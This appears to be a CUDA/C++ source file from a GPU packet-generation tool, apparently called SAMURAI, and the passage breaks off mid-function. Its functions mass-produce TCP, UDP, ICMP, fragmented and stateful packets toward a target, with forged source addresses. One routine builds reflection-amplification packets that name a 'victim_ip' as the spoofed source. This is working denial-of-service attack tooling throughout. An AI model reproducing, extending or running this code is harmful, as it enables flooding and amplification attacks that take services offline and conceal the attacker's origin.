// This file is included by gpu_packet_cuda.cu after prerequisite fragments.
// When opened standalone by IDE analysis, pull required fragments here.
#include "../gpu_packet_cuda.hpp"
#include <cstdio>
#include "tx_backend_doca_gpunetio.cuh"
#include "zero_copy_dataplane_contract.cuh"
#ifndef SAMURAI_WITH_DOCA_GPUNETIO_DEVICE
#define SAMURAI_WITH_DOCA_GPUNETIO_DEVICE 0
#endif
#if SAMURAI_WITH_DOCA_GPUNETIO_DEVICE
#include <doca_gpunetio_dev_eth_txq.cuh>
#endif
#ifndef SAMURAI_GPU_PACKET_CUDA_PREAMBLE_INCLUDED
#define SAMURAI_GPU_PACKET_CUDA_FRAGMENT_CHAIN 1
#include "preamble.cuh"
#include "kernels_l4.cuh"
#include "kernels_template_pool.cuh"
#include "kernels_fragment_amp.cuh"
#include "kernels_icmp_utils.cuh"
#undef SAMURAI_GPU_PACKET_CUDA_FRAGMENT_CHAIN
#endif

namespace {
constexpr uint64_t kMappedExportHeaderMagic = 0x53414d5552414931ull;  // SAMURAI1
constexpr uint32_t kMappedExportAllocKindCudaHost = 2u;

struct MappedExportHeader {
  uint64_t magic = kMappedExportHeaderMagic;
  uint32_t alloc_kind = kMappedExportAllocKindCudaHost;
  uint32_t reserved = 0u;
  size_t size = 0u;
  uint64_t pending_stream_handle = 0u;
  uint64_t pending_device_ptr = 0u;
};

inline bool zero_copy_output_enabled() {
  return env_int("SAMURAI_GPU_PACKET_ZEROCOPY_OUTPUT", 0) > 0;
}

inline DeviceBuffer allocate_packet_output_buffer(
    size_t payload_size,
    cudaStream_t stream,
    const char* cuda_malloc_error,
    const char* cuda_memset_error) {
  DeviceBuffer out;
  if (payload_size == 0) {
    return out;
  }

  if (zero_copy_output_enabled()) {
    const size_t total = sizeof(MappedExportHeader) + payload_size;
    void* raw = nullptr;
    cudaError_t rc = cudaHostAlloc(&raw, total, cudaHostAllocPortable | cudaHostAllocMapped);
    if (rc == cudaSuccess && raw) {
      auto* header = static_cast<MappedExportHeader*>(raw);
      header->magic = kMappedExportHeaderMagic;
      header->alloc_kind = kMappedExportAllocKindCudaHost;
      header->reserved = 0u;
      header->size = payload_size;
      header->pending_stream_handle = 0u;
      header->pending_device_ptr = 0u;

      auto* host_payload = reinterpret_cast<uint8_t*>(header + 1);
      uint8_t* dev_base = nullptr;
      cudaError_t map_rc = cudaHostGetDevicePointer(reinterpret_cast<void**>(&dev_base), raw, 0);
      if (map_rc == cudaSuccess && dev_base) {
        auto* dev_payload = dev_base + sizeof(MappedExportHeader);
        out.ptr = dev_payload;
        out.host_ptr = host_payload;
        out.host_base_ptr = static_cast<uint8_t*>(raw);
        out.size = payload_size;
        out.alloc_kind = DeviceBuffer::AllocKind::kMappedHost;
        throw_if_cuda(cudaMemsetAsync(out.ptr, 0, payload_size, stream), cuda_memset_error);
        return out;
      }
      cudaFreeHost(raw);
    }
  }

  throw_if_cuda(cudaMalloc(&out.ptr, payload_size), cuda_malloc_error);
  out.size = payload_size;
  out.host_ptr = nullptr;
  out.host_base_ptr = nullptr;
  out.alloc_kind = DeviceBuffer::AllocKind::kDevice;
  throw_if_cuda(cudaMemsetAsync(out.ptr, 0, payload_size, stream), cuda_memset_error);
  return out;
}
}  // namespace

PacketResult generate_packets(
    int64_t count,
    const std::string& target_ip,
    int64_t target_port,
    const std::string& protocol,
    bool spoof_ip,
    const std::string& real_src_ip,
    int64_t tcp_flags,
    bool has_ethernet,
    int64_t window,
    cudaStream_t stream,
    uint64_t gateway_mac,
    const std::string& spoof_subnet) {
  auto [spoof_base_ip, spoof_mask] = parse_subnet(spoof_subnet.empty() ? "1.0.0.0/8" : spoof_subnet);

  uint32_t target_ip_int = ip_to_int(target_ip);
  uint32_t real_src_ip_int = ip_to_int(real_src_ip);

  std::string proto = protocol;
  std::transform(proto.begin(), proto.end(), proto.begin(), ::tolower);

  uint8_t proto_int = TCP_PROTOCOL;
  if (proto == "udp") {
    proto_int = UDP_PROTOCOL;
  } else if (proto == "icmp") {
    proto_int = ICMP_PROTOCOL;
  }

  int64_t eth_len = has_ethernet ? ETHERNET_HEADER_LEN : 0;
  int64_t transport_len = 0;
  if (proto_int == TCP_PROTOCOL) {
    transport_len = TCP_HEADER_LEN_WITH_OPT;
  } else if (proto_int == UDP_PROTOCOL) {
    transport_len = UDP_HEADER_LEN;
  } else if (proto_int == ICMP_PROTOCOL) {
    transport_len = ICMP_HEADER_LEN;
  }

  int packet_size = static_cast<int>(eth_len + IP_HEADER_LEN + transport_len);
  size_t total_size = static_cast<size_t>(count) * static_cast<size_t>(packet_size);

  DeviceBuffer out = allocate_packet_output_buffer(
      total_size,
      stream,
      "cudaMalloc generate_packets output failed",
      "cudaMemsetAsync generate_packets failed");

  RNGAcquisition rng_acq = acquire_rng_states(count, stream);
  curandStatePhilox4_32_10_t* rng_states = rng_acq.ptr;
  int blocks = blocks_for_count(count);

  if (proto_int == TCP_PROTOCOL) {
    if (spoof_ip) {
      CUDA_KERNEL_LAUNCH(create_tcp_packets_kernel_spoof, blocks, kThreadsPerBlock, stream,
          out.ptr,
          count,
          target_ip_int,
          target_port,
          tcp_flags,
          has_ethernet ? 1 : 0,
          window,
          rng_states,
          gateway_mac,
          spoof_base_ip,
          spoof_mask);
      safe_kernel_launch("create_tcp_packets_kernel_spoof", cudaPeekAtLastError(), stream, false);
    } else {
      CUDA_KERNEL_LAUNCH(create_tcp_packets_kernel_nospoof, blocks, kThreadsPerBlock, stream,
          out.ptr,
          count,
          target_ip_int,
          target_port,
          real_src_ip_int,
          tcp_flags,
          has_ethernet ? 1 : 0,
          window,
          rng_states,
          gateway_mac);
      safe_kernel_launch("create_tcp_packets_kernel_nospoof", cudaPeekAtLastError(), stream, false);
    }
  } else if (proto_int == UDP_PROTOCOL) {
    if (spoof_ip) {
      CUDA_KERNEL_LAUNCH(create_udp_packets_kernel_spoof, blocks, kThreadsPerBlock, stream,
          out.ptr,
          count,
          target_ip_int,
          target_port,
          has_ethernet ? 1 : 0,
          rng_states,
          gateway_mac,
          spoof_base_ip,
          spoof_mask);
      safe_kernel_launch("create_udp_packets_kernel_spoof", cudaPeekAtLastError(), stream, false);
    } else {
      CUDA_KERNEL_LAUNCH(create_udp_packets_kernel_nospoof, blocks, kThreadsPerBlock, stream,
          out.ptr,
          count,
          target_ip_int,
          target_port,
          real_src_ip_int,
          has_ethernet ? 1 : 0,
          rng_states,
          gateway_mac);
      safe_kernel_launch("create_udp_packets_kernel_nospoof", cudaPeekAtLastError(), stream, false);
    }
  } else if (proto_int == ICMP_PROTOCOL) {
    CUDA_KERNEL_LAUNCH(create_icmp_packets_kernel, blocks, kThreadsPerBlock, stream,
        out.ptr,
        count,
        target_ip_int,
        real_src_ip_int,
        spoof_ip ? 1 : 0,
        has_ethernet ? 1 : 0,
        8,
        0,
        rng_states,
        gateway_mac,
        spoof_base_ip,
        spoof_mask,
        0);
    safe_kernel_launch("create_icmp_packets_kernel", cudaPeekAtLastError(), stream, false);
  } else {
    throw std::invalid_argument("GPU packet generation does not support protocol: " + protocol);
  }

  if (rng_acq.temporary && rng_acq.ptr) {
    cudaFree(rng_acq.ptr);
  }

  return PacketResult{std::move(out), packet_size};
}

PacketResult generate_packets_from_template(
    const uint8_t* template_bytes,
    size_t template_len,
    int64_t count,
    const std::string& real_src_ip,
    bool spoof_ip,
    bool has_ethernet,
    cudaStream_t stream,
    uint64_t gateway_mac,
    const std::string& spoof_subnet,
    bool force_global_fallback) {
  auto [spoof_base_ip, spoof_mask] = parse_subnet(spoof_subnet.empty() ? "1.0.0.0/8" : spoof_subnet);
  if (!template_bytes || template_len == 0) {
    throw std::invalid_argument("template_bytes must not be empty");
  }

  int packet_size = static_cast<int>(template_len);
  TemplateAcquisition template_acq = acquire_template_gpu(template_bytes, template_len, packet_size, stream);
  uint8_t* template_gpu = template_acq.ptr;

  size_t total_size = static_cast<size_t>(count) * static_cast<size_t>(packet_size);
  DeviceBuffer out = allocate_packet_output_buffer(
      total_size,
      stream,
      "cudaMalloc template output failed",
      "cudaMemsetAsync template output failed");

  uint32_t real_src_ip_int = ip_to_int(real_src_ip);
  RNGAcquisition rng_acq = acquire_rng_states(count, stream);
  curandStatePhilox4_32_10_t* rng_states = rng_acq.ptr;

  int64_t use_constant = 0;
  if (!force_global_fallback) {
    if (can_use_constant_memory(template_len, TEMPLATE_CONST_MAX)) {
      if (update_gpu_constant_template(template_bytes, template_len)) {
        use_constant = 1;
      } else {
        if (!g_warned_template_const_fallback.exchange(true)) {
          // one-time warning path kept for parity with python behavior
        }
      }
    }
  }

  int blocks = blocks_for_count(count);
  CUDA_KERNEL_LAUNCH(template_kernel, blocks, kThreadsPerBlock, stream,
      out.ptr,
      template_gpu,
      use_constant,
      count,
      packet_size,
      real_src_ip_int,
      spoof_ip ? 1 : 0,
      has_ethernet ? 1 : 0,
      rng_states,
      gateway_mac,
      spoof_base_ip,
      spoof_mask);
  safe_kernel_launch("template_kernel", cudaPeekAtLastError(), stream, false);

  if (template_acq.temporary && template_acq.ptr) {
    cudaFree(template_acq.ptr);
  }
  if (rng_acq.temporary && rng_acq.ptr) {
    cudaFree(rng_acq.ptr);
  }

  return PacketResult{std::move(out), packet_size};
}

PacketResult generate_packets_from_template(
    const std::vector<uint8_t>& template_bytes,
    int64_t count,
    const std::string& real_src_ip,
    bool spoof_ip,
    bool has_ethernet,
    cudaStream_t stream,
    uint64_t gateway_mac,
    const std::string& spoof_subnet,
    bool force_global_fallback) {
  return generate_packets_from_template(
      template_bytes.data(),
      template_bytes.size(),
      count,
      real_src_ip,
      spoof_ip,
      has_ethernet,
      stream,
      gateway_mac,
      spoof_subnet,
      force_global_fallback);
}

static void validate_flat_templates_input(
    const uint8_t* templates_flat,
    size_t templates_flat_len,
    int64_t packet_size,
    int64_t num_templates) {
  if (packet_size < 0 || num_templates < 0) {
    throw std::invalid_argument("packet_size and num_templates must be >= 0");
  }
  const size_t ps = static_cast<size_t>(packet_size);
  const size_t nt = static_cast<size_t>(num_templates);
  if (nt == 0) {
    return;
  }
  if (ps == 0) {
    throw std::invalid_argument("packet_size must be > 0 when num_templates > 0");
  }
  const size_t kMaxSize = static_cast<size_t>(-1);
  if (ps > (kMaxSize / nt)) {
    throw std::invalid_argument("templates size overflow");
  }
  const size_t expected = ps * nt;
  if (expected != templates_flat_len) {
    throw std::invalid_argument("templates_flat_len does not match packet_size*num_templates");
  }
  if (!templates_flat) {
    throw std::invalid_argument("templates_flat must not be null");
  }
}

PacketResult generate_packets_from_template_pool(
    const uint8_t* templates_flat,
    size_t templates_flat_len,
    int64_t packet_size,
    int64_t num_templates,
    int64_t count,
    const std::string& target_ip,
    const std::string& real_src_ip,
    bool spoof_ip,
    int64_t specific_src_port,
    bool has_ethernet,
    cudaStream_t stream,
    uint64_t gateway_mac,
    const std::string& spoof_subnet,
    bool force_global_fallback) {
  auto [spoof_base_ip, spoof_mask] = parse_subnet(spoof_subnet.empty() ? "1.0.0.0/8" : spoof_subnet);

  validate_flat_templates_input(templates_flat, templates_flat_len, packet_size, num_templates);
  if (num_templates == 0) {
    return PacketResult{};
  }

  uint32_t target_ip_int = ip_to_int(target_ip);
  uint32_t real_src_ip_int = real_src_ip.empty() ? 0u : ip_to_int(real_src_ip);

  TemplateAcquisition templates_acq =
      acquire_template_gpu(templates_flat, templates_flat_len, static_cast<int>(packet_size), stream);
  uint8_t* templates_gpu = templates_acq.ptr;

  size_t total_size = static_cast<size_t>(count) * static_cast<size_t>(packet_size);
  DeviceBuffer out = allocate_packet_output_buffer(
      total_size,
      stream,
      "cudaMalloc pool output failed",
      "cudaMemsetAsync pool output failed");

  RNGAcquisition rng_acq = acquire_rng_states(count, stream);
  curandStatePhilox4_32_10_t* rng_states = rng_acq.ptr;

  int64_t use_constant = 0;
  if (!force_global_fallback) {
    if (can_use_constant_memory(templates_flat_len, POOL_CONST_MAX)) {
      if (update_gpu_constant_pool(templates_flat, templates_flat_len)) {
        use_constant = 1;
      } else {
        if (!g_warned_pool_const_fallback.exchange(true)) {
        }
      }
    }
  }

  int blocks = blocks_for_count(count);
  CUDA_KERNEL_LAUNCH(pool_kernel, blocks, kThreadsPerBlock, stream,
      out.ptr,
      templates_gpu,
      static_cast<int64_t>(templates_flat_len),
      use_constant,
      count,
      packet_size,
      num_templates,
      target_ip_int,
      real_src_ip_int,
      spoof_ip ? 1 : 0,
      specific_src_port,
      has_ethernet ? 1 : 0,
      rng_states,
      gateway_mac,
      spoof_base_ip,
      spoof_mask);
  safe_kernel_launch("pool_kernel", cudaPeekAtLastError(), stream, false);

  if (templates_acq.temporary && templates_acq.ptr) {
    cudaFree(templates_acq.ptr);
  }
  if (rng_acq.temporary && rng_acq.ptr) {
    cudaFree(rng_acq.ptr);
  }

  return PacketResult{std::move(out), static_cast<int>(packet_size)};
}

PacketResult generate_packets_from_template_pool(
    const std::vector<std::vector<uint8_t>>& templates_bytes_list,
    int64_t count,
    const std::string& target_ip,
    const std::string& real_src_ip,
    bool spoof_ip,
    int64_t specific_src_port,
    bool has_ethernet,
    cudaStream_t stream,
    uint64_t gateway_mac,
    const std::string& spoof_subnet,
    bool force_global_fallback) {
  if (templates_bytes_list.empty()) {
    return PacketResult{};
  }

  int64_t num_templates = templates_bytes_list.size();
  int packet_size = static_cast<int>(templates_bytes_list[0].size());
  for (size_t i = 0; i < templates_bytes_list.size(); ++i) {
    if (static_cast<int>(templates_bytes_list[i].size()) != packet_size) {
      throw std::invalid_argument("All templates must be same size. Mismatch at index " + std::to_string(i));
    }
  }

  std::vector<uint8_t> flat_templates = to_bytes_flat(templates_bytes_list);
  return generate_packets_from_template_pool(
      flat_templates.data(),
      flat_templates.size(),
      packet_size,
      num_templates,
      count,
      target_ip,
      real_src_ip,
      spoof_ip,
      specific_src_port,
      has_ethernet,
      stream,
      gateway_mac,
      spoof_subnet,
      force_global_fallback);
}

PacketResult generate_fragmented_packets(
    const std::vector<uint8_t>& payload_bytes,
    int64_t count,
    const std::string& target_ip,
    int64_t target_port,
    const std::string& protocol,
    bool spoof_ip,
    const std::string& real_src_ip,
    bool has_ethernet,
    int64_t frag1_size,
    int64_t frag2_size,
    cudaStream_t stream,
    uint64_t gateway_mac,
    const std::string& spoof_subnet) {
  auto [spoof_base_ip, spoof_mask] = parse_subnet(spoof_subnet.empty() ? "1.0.0.0/8" : spoof_subnet);

  std::string proto = protocol;
  std::transform(proto.begin(), proto.end(), proto.begin(), ::tolower);
  int64_t proto_int = (proto == "tcp") ? TCP_PROTOCOL : UDP_PROTOCOL;

  int64_t eth_len = has_ethernet ? ETHERNET_HEADER_LEN : 0;
  int64_t trans_len = (proto_int == UDP_PROTOCOL) ? 8 : 20;
  int64_t min_frag1 = eth_len + IP_HEADER_LEN + trans_len;
  int64_t min_frag2 = eth_len + IP_HEADER_LEN;
  if (frag1_size < min_frag1 || frag2_size < min_frag2) {
    throw std::invalid_argument("Fragment sizes too small");
  }

  int64_t frag1_ip_payload_len = frag1_size - eth_len - IP_HEADER_LEN;
  if ((frag1_ip_payload_len % 8) != 0) {
    throw std::invalid_argument("frag1_size causes unaligned fragment payload");
  }

  DeviceArray<uint8_t> payload_gpu(payload_bytes, stream);
  int64_t payload_size = static_cast<int64_t>(payload_bytes.size());

  uint32_t target_ip_int = ip_to_int(target_ip);
  uint32_t real_src_ip_int = ip_to_int(real_src_ip);

  size_t total_buf_size = static_cast<size_t>(count) * static_cast<size_t>(frag1_size + frag2_size);
  DeviceBuffer out = allocate_packet_output_buffer(
      total_buf_size,
      stream,
      "cudaMalloc fragmented output failed",
      "cudaMemsetAsync fragmented output failed");

  RNGAcquisition rng_acq = acquire_rng_states(count, stream);
  curandStatePhilox4_32_10_t* rng_states = rng_acq.ptr;

  int blocks = blocks_for_count(count);
  CUDA_KERNEL_LAUNCH(create_fragmented_packets_kernel, blocks, kThreadsPerBlock, stream,
      out.ptr,
      payload_gpu.ptr,
      count,
      target_ip_int,
      target_port,
      proto_int,
      real_src_ip_int,
      spoof_ip ? 1 : 0,
      has_ethernet ? 1 : 0,
      frag1_size,
      frag2_size,
      payload_size,
      rng_states,
      gateway_mac,
      spoof_base_ip,
      spoof_mask);
  safe_kernel_launch("create_fragmented_packets_kernel", cudaPeekAtLastError(), stream, false);

  if (rng_acq.temporary && rng_acq.ptr) {
    cudaFree(rng_acq.ptr);
  }

  return PacketResult{std::move(out), static_cast<int>(frag1_size + frag2_size)};
}

PacketResult generate_amplification_packets(
    const std::vector<uint8_t>& template_bytes,
    const std::vector<std::string>& reflectors_ips,
    const std::string& victim_ip,
    int64_t count,
    bool has_ethernet,
    cudaStream_t stream,
    uint64_t gateway_mac) {
  if (reflectors_ips.empty()) {
    throw std::invalid_argument("reflectors_ips must not be empty");
  }

  int packet_size = static_cast<int>(template_bytes.size());
  DeviceArray<uint8_t> template_gpu(template_bytes, stream);

  std::vector<uint32_t> reflectors;
  reflectors.reserve(reflectors_ips.size());
  for (const auto& ip : reflectors_ips) {
    reflectors.push_back(ip_to_int(ip));
  }
  DeviceArray<uint32_t> reflectors_gpu(reflectors, stream);

  uint32_t victim_ip_int = ip_to_int(victim_ip);
  int64_t num_reflectors = static_cast<int64_t>(reflectors_ips.size());

  size_t total_size = static_cast<size_t>(count) * static_cast<size_t>(packet_size);
  DeviceBuffer out = allocate_packet_output_buffer(
      total_size,
      stream,
      "cudaMalloc amplification output failed",
      "cudaMemsetAsync amplification output failed");

  RNGAcquisition rng_acq = acquire_rng_states(count, stream);
  curandStatePhilox4_32_10_t* rng_states = rng_acq.ptr;
  int blocks = blocks_for_count(count);

  CUDA_KERNEL_LAUNCH(amplification_kernel_v2, blocks, kThreadsPerBlock, stream,
      out.ptr,
      template_gpu.ptr,
      reflectors_gpu.ptr,
      victim_ip_int,
      count,
      packet_size,
      num_reflectors,
      has_ethernet ? 1 : 0,
      rng_states,
      gateway_mac);
  safe_kernel_launch("amplification_kernel_v2", cudaPeekAtLastError(), stream, false);

  if (rng_acq.temporary && rng_acq.ptr) {
    cudaFree(rng_acq.ptr);
  }

  return PacketResult{std::move(out), packet_size};
}

PacketResult generate_stateful_packets(
    const uint8_t* templates_flat,
    size_t templates_flat_len,
    int64_t packet_size,
    int64_t num_templates,
    int64_t count,
    const std::string& target_ip,
    bool spoof_ip,
    const std::string& real_src_ip,
    int64_t specific_src_port,
    bool has_ethernet,
    cudaStream_t stream,
    uint64_t gateway_mac,
    const std::string& spoof_subnet,
    const uint32_t* seq_list,
    size_t seq_len,
    const uint32_t* ack_list,
    size_t ack_len,
    const uint8_t* state_list,
    size_t state_len,
    const uint32_t* actual_lengths,
    size_t actual_lengths_len,
    const uint16_t* window_sizes,
    size_t window_sizes_len,
    const uint16_t* mss_values,
    size_t mss_values_len,
    const uint8_t* ttls,
    size_t ttls_len,
    bool force_global_fallback) {
  validate_flat_templates_input(templates_flat, templates_flat_len, packet_size, num_templates);
  if (num_templates == 0) {
    return PacketResult{};
  }

  TemplateAcquisition templates_acq =
      acquire_template_gpu(templates_flat, templates_flat_len, static_cast<int>(packet_size), stream);
  uint8_t* templates_gpu = templates_acq.ptr;

  size_t total_size = static_cast<size_t>(count) * static_cast<size_t>(packet_size);
  DeviceBuffer out = allocate_packet_output_buffer(
      total_size,
      stream,
      "cudaMalloc stateful output failed",
      "cudaMemsetAsync stateful output failed");

  RNGAcquisition rng_acq = acquire_rng_states(count, stream);
  curandStatePhilox4_32_10_t* rng_states = rng_acq.ptr;

  uint32_t target_ip_int = ip_to_int(target_ip);
  uint32_t real_src_ip_int = ip_to_int(real_src_ip);
  auto [spoof_base_ip, spoof_mask] = parse_subnet(spoof_subnet.empty() ? "1.0.0.0/8" : spoof_subnet);

  std::vector<uint32_t> seq_default;
  std::vector<uint32_t> ack_default;
  std::vector<uint8_t> state_default;
  std::vector<uint32_t> lengths_default;
  std::vector<uint16_t> wins_default;
  std::vector<uint16_t> msss_default;
  std::vector<uint8_t> ttl_default;

  const uint32_t* seq_ptr = seq_list;
  size_t seq_count = seq_len;
  if (seq_count == 0) {
    seq_default.assign(static_cast<size_t>(count), 0);
    seq_ptr = seq_default.data();
    seq_count = seq_default.size();
  }

  const uint32_t* ack_ptr = ack_list;
  size_t ack_count = ack_len;
  if (ack_count == 0) {
    ack_default.assign(static_cast<size_t>(count), 0);
    ack_ptr = ack_default.data();
    ack_count = ack_default.size();
  }

  const uint8_t* state_ptr = state_list;
  size_t state_count = state_len;
  if (state_count == 0) {
    state_default.assign(static_cast<size_t>(count), 0);
    state_ptr = state_default.data();
    state_count = state_default.size();
  }

  const uint32_t* lengths_ptr = actual_lengths;
  size_t lengths_count = actual_lengths_len;
  if (lengths_count == 0) {
    lengths_default.assign(static_cast<size_t>(num_templates), static_cast<uint32_t>(packet_size));
    lengths_ptr = lengths_default.data();
    lengths_count = lengths_default.size();
  }

  const uint16_t* win_ptr = window_sizes;
  size_t win_count = window_sizes_len;
  if (win_count == 0) {
    wins_default.assign(static_cast<size_t>(count), 0);
    win_ptr = wins_default.data();
    win_count = wins_default.size();
  }

  const uint16_t* mss_ptr = mss_values;
  size_t mss_count = mss_values_len;
  if (mss_count == 0) {
    msss_default.assign(static_cast<size_t>(count), 0);
    mss_ptr = msss_default.data();
    mss_count = msss_default.size();
  }

  const uint8_t* ttl_ptr = ttls;
  size_t ttl_count = ttls_len;
  if (ttl_count == 0) {
    ttl_default.assign(static_cast<size_t>(count), 0);
    ttl_ptr = ttl_default.data();
    ttl_count = ttl_default.size();
  }

  DeviceArray<uint32_t> d_seq(seq_ptr, seq_count, stream);
  DeviceArray<uint32_t> d_ack(ack_ptr, ack_count, stream);
  DeviceArray<uint8_t> d_state(state_ptr, state_count, stream);
  DeviceArray<uint32_t> d_lengths(lengths_ptr, lengths_count, stream);
  DeviceArray<uint16_t> d_win(win_ptr, win_count, stream);
  DeviceArray<uint16_t> d_mss(mss_ptr, mss_count, stream);
  DeviceArray<uint8_t> d_ttl(ttl_ptr, ttl_count, stream);

  int64_t use_constant = 0;
  if (!force_global_fallback) {
    if (can_use_constant_memory(templates_flat_len, POOL_CONST_MAX)) {
      if (update_gpu_constant_pool(templates_flat, templates_flat_len)) {
        use_constant = 1;
      } else {
        if (!g_warned_pool_const_stateful_fallback.exchange(true)) {
        }
      }
    }
  }

  int blocks = blocks_for_count(count);
  CUDA_KERNEL_LAUNCH(stateful_pool_kernel, blocks, kThreadsPerBlock, stream,
      out.ptr,
      templates_gpu,
      static_cast<int64_t>(templates_flat_len),
      use_constant,
      count,
      packet_size,
      num_templates,
      target_ip_int,
      real_src_ip_int,
      spoof_ip ? 1 : 0,
      specific_src_port,
      has_ethernet ? 1 : 0,
      rng_states,
      gateway_mac,
      spoof_base_ip,
      spoof_mask,
      d_seq.ptr,
      d_ack.ptr,
      d_state.ptr,
      d_lengths.ptr,
      d_win.ptr,
      d_mss.ptr,
      d_ttl.ptr);
  safe_kernel_launch("stateful_pool_kernel", cudaPeekAtLastError(), stream, false);

  if (templates_acq.temporary && templates_acq.ptr) {
    cudaFree(templates_acq.ptr);
  }
  if (rng_acq.temporary && rng_acq.ptr) {
    cudaFree(rng_acq.ptr);
  }

  return PacketResult{std::move(out), static_cast<int>(packet_size)};
}

PacketResult generate_stateful_packets(
    const std::vector<std::vector<uint8_t>>& templates_bytes_list,
    int64_t count,
    const std::string& target_ip,
    bool spoof_ip,
    const std::string& real_src_ip,
    int64_t specific_src_port,
    bool has_ethernet,
    cudaStream_t stream,
    uint64_t gateway_mac,
    const std::string& spoof_subnet,
    const std::vector<uint32_t>& seq_list,
    const std::vector<uint32_t>& ack_list,
    const std::vector<uint8_t>& state_list,
    const std::vector<uint32_t>& actual_lengths,
    const std::vector<uint16_t>& window_sizes,
    const std::vector<uint16_t>& mss_values,
    const std::vector<uint8_t>& ttls,
    bool force_global_fallback) {
  if (templates_bytes_list.empty()) {
    return PacketResult{};
  }

  int64_t num_templates = templates_bytes_list.size();
  int packet_size = static_cast<int>(templates_bytes_list[0].size());
  for (size_t i = 0; i < templates_bytes_list.size(); ++i) {
    if (static_cast<int>(templates_bytes_list[i].size()) != packet_size) {
      throw std::invalid_argument("All templates must be same size. Mismatch at index " + std::to_string(i));
    }
  }

  std::vector<uint8_t> flat_templates = to_bytes_flat(templates_bytes_list);
  return generate_stateful_packets(
      flat_templates.data(),
      flat_templates.size(),
      packet_size,
      num_templates,
      count,
      target_ip,
      spoof_ip,
      real_src_ip,
      specific_src_port,
      has_ethernet,
      stream,
      gateway_mac,
      spoof_subnet,
      seq_list.data(),
      seq_list.size(),
      ack_list.data(),
      ack_list.size(),
      state_list.data(),
      state_list.size(),
      actual_lengths.data(),
      actual_lengths.size(),
      window_sizes.data(),
      window_sizes.size(),
      mss_values.data(),
      mss_values.size(),
      ttls.data(),
      ttls.size(),
      force_global_fallback);
}

PacketResult generate_icmp_packets(
    int64_t count,
    const std::string& target_ip,
    const std::string& real_src_ip,
    bool spoof_ip,
    bool has_ethernet,
    int64_t icmp_type,
    int64_t icmp_code,
    int64_t payload_size,
    cudaStream_t stream,
    uint64_t gateway_mac,
    const std::string& spoof_subnet) {
  auto [spoof_base_ip, spoof_mask] = parse_subnet(spoof_subnet.empty() ? "1.0.0.0/8" : spoof_subnet);

  uint32_t target_ip_int = ip_to_int(target_ip);
  uint32_t real_src_ip_int = ip_to_int(real_src_ip);

  int64_t eth_len = has_ethernet ? ETHERNET_HEADER_LEN : 0;
  int64_t icmp_len = ICMP_HEADER_LEN + payload_size;
  int packet_size = static_cast<int>(eth_len + IP_HEADER_LEN + icmp_len);

  size_t total_size = static_cast<size_t>(count) * static_cast<size_t>(packet_size);
  DeviceBuffer out = allocate_packet_output_buffer(
      total_size,
      stream,
      "cudaMalloc icmp output failed",
      "cudaMemsetAsync icmp output failed");

  RNGAcquisition rng_acq = acquire_rng_states(count, stream);
  curandStatePhilox4_32_10_t* rng_states = rng_acq.ptr;

  int blocks = blocks_for_count(count);
  CUDA_KERNEL_LAUNCH(create_icmp_packets_kernel, blocks, kThreadsPerBlock, stream,
      out.ptr,
      count,
      target_ip_int,
      real_src_ip_int,
      spoof_ip ? 1 : 0,
      has_ethernet ? 1 : 0,
      icmp_type,
      icmp_code,
      rng_states,
      gateway_mac,
      spoof_base_ip,
      spoof_mask,
      payload_size);
  safe_kernel_launch("create_icmp_packets_kernel", cudaPeekAtLastError(), stream, false);

  if (rng_acq.temporary && rng_acq.ptr) {
    cudaFree(rng_acq.ptr);
  }

  return PacketResult{std::move(out), packet_size};
}

BenchmarkResult benchmark_template_generation_paths(
    const std::vector<uint8_t>& template_bytes,
    int count,
    int iterations,
    const std::string& real_src_ip,
    bool spoof_ip,
    bool has_ethernet,
    uint64_t gateway_mac,
    const std::string& spoof_subnet) {
  if (iterations < 1) {
    throw std::invalid_argument("iterations must be >= 1");
  }

  cudaStream_t stream = nullptr;
  throw_if_cuda(cudaStreamCreateWithFlags(&stream, cudaStreamNonBlocking), "cudaStreamCreateWithFlags failed");

  auto run_path = [&](bool force_global) {
    generate_packets_from_template(
        template_bytes,
        std::max(1, std::min(count, 2048)),
        real_src_ip,
        spoof_ip,
        has_ethernet,
        stream,
        gateway_mac,
        spoof_subnet,
        force_global);
    throw_if_cuda(cudaStreamSynchronize(stream), "warmup sync failed");

    GenerationTelemetry before = get_generation_telemetry();

    double total_seconds = 0.0;
    for (int i = 0; i < iterations; ++i) {
      auto start = std::chrono::high_resolution_clock::now();
      PacketResult res = generate_packets_from_template(
          template_bytes,
          count,
          real_src_ip,
          spoof_ip,
          has_ethernet,
          stream,
          gateway_mac,
          spoof_subnet,
          force_global);
      throw_if_cuda(cudaStreamSynchronize(stream), "benchmark sync failed");
      auto stop = std::chrono::high_resolution_clock::now();
      total_seconds += std::chrono::duration<double>(stop - start).count();
      (void)res;
    }

    GenerationTelemetry after = get_generation_telemetry();
    return telemetry_delta_to_path(before, after, count, total_seconds, iterations);
  };

  GenerationTelemetry before_all = get_generation_telemetry();
  BenchmarkPathResult auto_result = run_path(false);
  BenchmarkPathResult global_result = run_path(true);
  GenerationTelemetry after_all = get_generation_telemetry();

  BenchmarkResult out;
  out.count = count;
  out.iterations = iterations;
  out.template_size = static_cast<int>(template_bytes.size());
  out.constant = auto_result;
  out.global = global_result;
  out.auto_path = auto_result;
  out.forced_global_fallback = global_result;

  out.generation_telemetry.gpu_template_h2d_copy_count =
      (after_all.gpu_template_h2d_copy_count >= before_all.gpu_template_h2d_copy_count)
          ? (after_all.gpu_template_h2d_copy_count - before_all.gpu_template_h2d_copy_count)
          : 0;
  out.generation_telemetry.gpu_template_h2d_copy_bytes =
      (after_all.gpu_template_h2d_copy_bytes >= before_all.gpu_template_h2d_copy_bytes)
          ? (after_all.gpu_template_h2d_copy_bytes - before_all.gpu_template_h2d_copy_bytes)
          : 0;
  out.generation_telemetry.gpu_rng_state_alloc_count =
      (after_all.gpu_rng_state_alloc_count >= before_all.gpu_rng_state_alloc_count)
          ? (after_all.gpu_rng_state_alloc_count - before_all.gpu_rng_state_alloc_count)
          : 0;
  out.generation_telemetry.gpu_rng_state_reuse_count =
      (after_all.gpu_rng_state_reuse_count >= before_all.gpu_rng_state_reuse_count)
          ? (after_all.gpu_rng_state_reuse_count - before_all.gpu_rng_state_reuse_count)
          : 0;
  out.generation_telemetry.gpu_template_cache_hit_count =
      (after_all.gpu_template_cache_hit_count >= before_all.gpu_template_cache_hit_count)
          ? (after_all.gpu_template_cache_hit_count - before_all.gpu_template_cache_hit_count)
          : 0;
  out.generation_telemetry.gpu_template_cache_miss_count =
      (after_all.gpu_template_cache_miss_count >= before_all.gpu_template_cache_miss_count)
          ? (after_all.gpu_template_cache_miss_count - before_all.gpu_template_cache_miss_count)
          : 0;

